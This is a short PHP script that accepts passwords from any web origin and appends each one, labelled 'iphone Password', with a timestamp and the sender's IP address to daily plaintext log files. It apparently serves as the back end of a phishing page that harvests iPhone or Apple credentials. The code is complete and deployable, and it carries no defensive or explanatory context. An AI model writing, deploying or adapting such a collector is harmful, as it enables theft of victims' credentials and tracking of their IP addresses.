<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');

// Ensure output is JSON
ini_set('display_errors', 0);
error_reporting(0);

try {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $password = isset($_POST['password']) ? sanitize_input($_POST['password']) : '';
        $timestamp = isset($_POST['timestamp']) ? sanitize_input($_POST['timestamp']) : date('Y-m-d H:i:s');

        if (!empty($password)) {
            $logsDir = __DIR__ . '/password_logs';
            
            // Create logs directory if it doesn't exist
            if (!is_dir($logsDir)) {
                mkdir($logsDir, 0755, true);
            }

            $filename = 'passwords_log_' . date('Y-m-d') . '.txt';
            $filepath = $logsDir . '/' . $filename;

            $logEntry = "\n" . str_repeat("=", 60) . "\n";
            $logEntry .= "Timestamp: " . $timestamp . "\n";
            $logEntry .= "iphone Password: " . $password . "\n";
            $logEntry .= "IP Address: " . get_client_ip() . "\n";
            $logEntry .= str_repeat("=", 60) . "\n";

            if (file_put_contents($filepath, $logEntry, FILE_APPEND | LOCK_EX)) {
                echo json_encode([
                    'success' => true,
                    'message' => 'Password saved successfully',
                    'file' => $filename
                ]);
                exit;
            } else {
                echo json_encode([
                    'success' => false,
                    'message' => 'Failed to save password'
                ]);
                exit;
            }
        } else {
            echo json_encode([
                'success' => false,
                'message' => 'No password provided'
            ]);
            exit;
        }
    } else {
        echo json_encode([
            'success' => false,
            'message' => 'Invalid request method'
        ]);
        exit;
    }
} catch (Exception $e) {
    echo json_encode([
        'success' => false,
        'message' => 'Server error: ' . $e->getMessage()
    ]);
    exit;
}

function sanitize_input($input) {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

function get_client_ip() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    }
}
?>